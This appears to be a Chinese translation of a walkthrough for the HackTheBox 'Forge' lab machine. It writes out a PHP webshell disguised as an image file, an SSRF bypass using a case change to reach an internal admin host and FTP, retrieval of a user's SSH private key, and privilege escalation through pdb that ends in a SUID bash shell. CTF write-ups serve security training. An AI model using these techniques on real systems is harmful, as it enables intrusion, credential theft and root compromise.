# 从 HackTheBox 锻造—详细演练

> 原文：<https://infosecwriteups.com/forge-from-hackthebox-detailed-walkthrough-26cec1c8df1a?source=collection_archive---------1----------------------->

展示完成盒子所需的所有工具和技术。

# 机器信息

![](img/548d14e1223f81b9ec07b2a657eeb318.png)

用黑盒子锻造

Forge 是 HackTheBox 上的中型机器。我们从一个简单的网站开始，经过一些枚举和测试，我们找到了一种方法来上传一个文件，允许在机器上执行命令。我们用这个来解密一个 SSH 私有密钥，它给了我们用户级的访问权限。权限提升包括利用易受攻击的 Python 脚本和使用 pdb 获取根外壳。

所需技能是网络和操作系统枚举知识。学习的技能是调查和绕过网络服务器上的防御。

[](https://www.hackthebox.eu/home/machines/profile/376) [## 破解盒子::渗透测试实验室——伪造

### 登录 Hack The Box 平台，让您的笔测试和网络安全技能更上一层楼！

www.hackthebox.eu](https://www.hackthebox.eu/home/machines/profile/376) 

# 初步侦察

像往常一样，让我们从 Nmap 开始:

![](img/ef73efd79d41b0834ee0fd70a2955aa2.png)

Nmap TCP 端口扫描

乍一看没什么可做的。首先将服务器 IP 添加到我们的 hosts 文件中:

```
┌──(root💀kali)-[~/htb/forge]
└─# echo 10.10.11.111 forge.htb >> /etc/hosts
```

# 网站探索

我们有一个简单的静态网页，图片画廊:

![](img/d1241aca4e108606d9daf219fd1c94b2.png)

80 端口上的画廊网站

这里没有什么有趣的东西，源代码也没有揭示任何东西。我们有上传图片的链接:

![](img/ec04872c5e7852d7b27bacafa6f4c526.png)

在 Forge 网站上传图片部分

点击**从 url** 上传，并输入 [http://admin.forge.htb](http://admin.forge.htb) ，得到如下信息:

![](img/3af04f018fbc93fdaebd10b274eb22b2.png)

从服务器的 URL 上传被阻止

# 恶意文件

所以接下来我创建了一个假的 jpg 来测试命令的执行:

```
┌──(root💀kali)-[~/htb/forge]
└─# cat test.php.jpg
GIF89a;
<?php
$cmd=$_GET['cmd'];
system($cmd);
?>
```

我点击了**上传本地文件**，选择了上面我创建的文件:

![](img/89ad91ec0e63eb3ce349a1bc190699fd.png)

从本地文件上传作品

这似乎奏效了:

![](img/8d61bfbb807b3ffc0265b3b170498e4f.png)

上传文件会返回 URL

检查我是否看到文件在创建时已上传:

```
┌──(root💀kali)-[~/htb/forge]
└─# curl http://forge.htb/uploads/IKExHjc8JZpazyGNcp02
GIF89a;
<?php
$cmd=$_GET['cmd'];
system($cmd);
?>
```

# Gobuster

但是它不被视为 PHP 文件，所以双扩展名不起作用。一些枚举的时间:

![](img/96c11db0855ba60509cf84cec197a98d.png)

目录的 Gobuster 枚举

我没有找到任何感兴趣的子文件夹，接下来尝试 vhosts:

![](img/3c78645cef962658ae026317bc147a6a.png)

虚拟主机的 Gobuster 枚举

这里的输出很长，包含所有的 302，但是搜索 20x 的状态代码发现了这个:

```
┌──(root💀kali)-[~/htb/forge]
└─# cat results.txt | grep "Status: 20"
Found: admin.forge.htb (Status: 200) [Size: 27]
```

# 管理门户

让我们添加到我们的主机文件:

```
┌──(root💀kali)-[~/htb/forge]
└─# echo 10.10.11.111 admin.forge.htb >> /etc/hosts
```

试图浏览到它给出了这个:

![](img/4853fefa91e9190674d60594b50f4ea5.png)

对管理门户的访问被阻止

在对文件和 URL 进行了大量的修改后，我终于发现黑名单是区分大小写的，所以这是可行的:

![](img/59df2af576add8454129a22fabbf53b0.png)

使用不同的大小写绕过黑名单

我没有提供文件，只是进入管理子网站，我们得到这个:

![](img/2f9b73f9cbf99731e8547eb369684e72.png)

成功上传会返回另一个 URL

但是，在浏览器中查看它会产生一个错误:

![](img/f84eb9e30757275a40c59b9be6f92d6c.png)

尝试查看管理 URL 时出错

# 管理重定向

如果我们使用 curl，我们会看到链接实际上是一个 html 页面:

![](img/0ad99c9b3f379074e2e83d7e49a2aa73.png)

返回了管理门户页面源

如果我们卷曲它，我们会得到和以前一样的信息:

```
┌──(root💀kali)-[~/htb/forge]
└─# curl http://ADMIN.FORGE.HTB/announcements
Only localhost is allowed!
```

# 旁路保护

如果我们将[http://ADMIN.FORGE.HTB/announcements](http://ADMIN.FORGE.HTB/announcements)放入上传页面上的“从 url 上传”框并提交，我们会得到另一个文件:

![](img/ca1de90615cbedcded100f528bdc3116.png)

从上传页面收到另一个 URL

如果我们把它卷起来:

![](img/5adef8edd09dc3e58c8dad88d357e422.png)

通知页面源已返回

# 上传页面

为了避免在浏览器中浪费时间，从现在开始我将改用 Curl。上面我们已经得到了 FTP 证书和一个提示，我们可以通过/上传使用？u=参数。从前面的扫描中我们看到 FTP 被过滤，所以可以假设我们需要通过相同的网页访问。

下面是我们使用 Curl 的方法:

```
┌──(root💀kali)-[~/htb/forge]
└─# curl -s -d 'url=http://ADMIN.FORGE.HTB/upload?u=ftp://<HIDDEN>@FORGE.HTB&remote=1' -X POST http://forge.htb/upload
```

由此我们使用-X 给出上传页面的 URL，然后使用-d 发送我们想要发布的数据。这里我给了它 FTP 证书。

反应看起来不错:

```
<center>
    <strong>File uploaded successfully to the following url:</strong>
    </center>
    </h1>
    <h1>
        <center>
            <strong><a href="http://forge.htb/uploads/lmlmHMB1xbKc89Cg8jJm">http://forge.htb/uploads/lmlmHMB1xbKc89Cg8jJm</strong>
        </center>
```

我们可以看到用户主文件夹的内容:

```
┌──(root💀kali)-[~/htb/forge]
└─# curl http://forge.htb/uploads/lmlmHMB1xbKc89Cg8jJm                                                                                 
drwxr-xr-x    3 1000     1000         4096 Aug 04 19:23 snap
-rw-r-----    1 0        1000           33 Oct 22 04:54 user.txt
```

# 卷曲计数

我们可以通过将从 curl 返回的文件名传递给 curl，剪切出我们想要的部分，从而使这变得更容易:

```
┌──(root💀kali)-[~/htb/forge]
└─# curl `curl -s -d 'url=http://ADMIN.FORGE.HTB/upload?u=ftp://<HIDDEN>@ADMIN.FORGE.HTB&remote=1' -X POST http://forge.htb/upload | grep uploads | cut -d '"' -f 2` 
drwxr-xr-x    3 1000     1000         4096 Aug 04 19:23 snap
-rw-r-----    1 0        1000           33 Oct 22 04:54 user.txt
```

现在我们可以更容易地与它互动。让我们获取用户标志:

```
┌──(root💀kali)-[~/htb/forge]
└─# curl `curl -s -d 'url=http://ADMIN.FORGE.HTB/upload?u=ftp://<HIDDEN>@ADMIN.FORGE.HTB/user.txt&remote=1' -X POST http://forge.htb/upload | grep uploads | cut -d '"' -f 2`
<HIDDEN>
```

# 数据泄漏

我花了一些时间试图找到一些有用的东西，最终记住你不能在 FTP 中看到隐藏的文件。会不会简单到用户有一个. ssh 文件夹，里面有一个我可以获取的私钥:

```
┌──(root💀kali)-[~/htb/forge]
└─# curl `curl -s -d 'url=http://ADMIN.FORGE.HTB/upload?u=ftp://<HIDDEN>@ADMIN.FORGE.HTB/user.txt&remote=1' -X POST http://forge.htb/upload | grep uploads | cut -d '"' -f 2`
<HIDDEN>
```

原来就是这么简单！让我们将它回显到 Kali 上的一个文件中，这样我们就可以使用它通过 SSH 进行连接:

```
┌──(root💀kali)-[~/htb/forge]
└─# echo "-----BEGIN OPENSSH PRIVATE KEY-----     
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gt
NhAAAAAwEAAQAAAYEAnZIO+Qywfgnftqo5as+orHW/w1WbrG6i6B7Tv2PdQ09NixOmtH
<SNIP>
-----END OPENSSH PRIVATE KEY-----
" > /root/htb/forge/id_rsa

┌──(root💀kali)-[~/htb/forge]
└─# chmod 600 id_rsa
```

# SSH 访问

现在我们可以以用户身份登录:

```
┌──(root💀kali)-[~/htb/forge]
└─# ssh -i id_rsa user@forge.htb
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-81-generic x86_64)
Last login: Sat Oct 23 15:39:54 2021 from 10.10.15.24
-bash-5.0$ whoami
user
```

我首先检查了 sudo 权限，并立即找到了我们的升级途径:

```
-bash-5.0$ sudo -l
Matching Defaults entries for user on forge:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User user may run the following commands on forge:
    (ALL : ALL) NOPASSWD: /usr/bin/python3 /opt/remote-manage.py
```

# Python 脚本

我们可以在没有密码的情况下以 root 用户身份运行 python 脚本。让我们检查一下脚本:

![](img/6016f37aeb8431b739711bc2a6526192.png)

远程管理 Python 脚本

我们看到这是一个简单的脚本，运行时监听本地主机上的随机端口。当你连接到它，你有几个选项来查看进程，内存或插座。它甚至给了我们密码！关键部分是 except 子句，它将我们带到名为 [pdb](https://docs.python.org/3/library/pdb.html) 的交互式源代码调试器。如果我们触发一个异常，我们将以 root 用户身份出现在 Python 提示符下，这样我们就可以很容易地完成装箱。

让我们以 root 用户身份运行脚本:

```
-bash-5.0$ sudo /usr/bin/python3 /opt/remote-manage.py
Listening on localhost:49630
```

我们看到它在端口 49630 上等待我们连接。让我们再次以用户身份通过 SSH 从第二个终端登录:

```
┌──(root💀kali)-[~/htb/forge]
└─# ssh -i id_rsa user@forge.htb                             
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-81-generic x86_64)
Last login: Sun Oct 24 10:10:40 2021 from 10.10.14.192
-bash-5.0$
```

现在，我们可以连接到本地主机上的脚本:

```
-bash-5.0$ nc localhost 49630
Enter the secret passsword: <HIDDEN>
Welcome admin!

What do you wanna do: 
[1] View processes
[2] View free memory
[3] View listening sockets
[4] Quit
```

# 根标志

您可以输入四个预期数字之外的任何数字。之后，脚本似乎挂起，如果您切换到您的另一个终端，您会看到脚本已经崩溃，您现在在 pdb:

```
invalid literal for int() with base 10: b'pencerwashere'
> /opt/remote-manage.py(27)<module>()
-> option = int(clientsock.recv(1024).strip())
(Pdb)
```

我们看到脚本导入了操作系统模块，因此我们可以使用它以 root 用户身份执行系统命令:

```
(Pdb) import os
(Pdb) os.system ('cp /bin/bash /dev/shm/bash')
(Pdb) os.system ('chmod u+s /dev/shm/bash')
(Pdb) exit
```

在这里，我们可以做很多不同的事情，我只是将 bash 复制到一个临时区域，并添加了 sticky 位，这样我就可以在没有密码的情况下以 root 用户身份运行它。

现在，我们可以抓取根标志来完成该框:

```
-bash-5.0$ cd /dev/shm
-bash-5.0$ bash -p
bash-5.0# whoami
root
bash-5.0# cat /root/root.txt 
<HIDDEN>
```

这是一个很容易说它被归类为中等的盒子。我希望你喜欢它，下次再见。

如果你喜欢这篇文章，请给我一两个掌声(这是免费的！)

推特—[https://twitter.com/pencer_io](https://twitter.com/pencer_io)
网站— [https://pencer.io](https://pencer.io/)

*原载于 2022 年 1 月 20 日*[*https://pencer . io*](https://pencer.io/ctf/ctf-htb-forge)*。*

🔈🔈 **Infosec Writeups 正在组织其首次虚拟会议和网络活动。如果你对信息安全感兴趣，这是最酷的地方，有 16 个令人难以置信的演讲者和 10 多个小时充满力量的讨论会议。** [**查看更多详情，在此注册。**](https://iwcon.live/)

[](https://iwcon.live/) [## IWCon2022 - Infosec 书面报告虚拟会议

### 与世界上最优秀的信息安全专家建立联系。了解网络安全专家如何取得成功。将新技能添加到您的…

iwcon.live](https://iwcon.live/)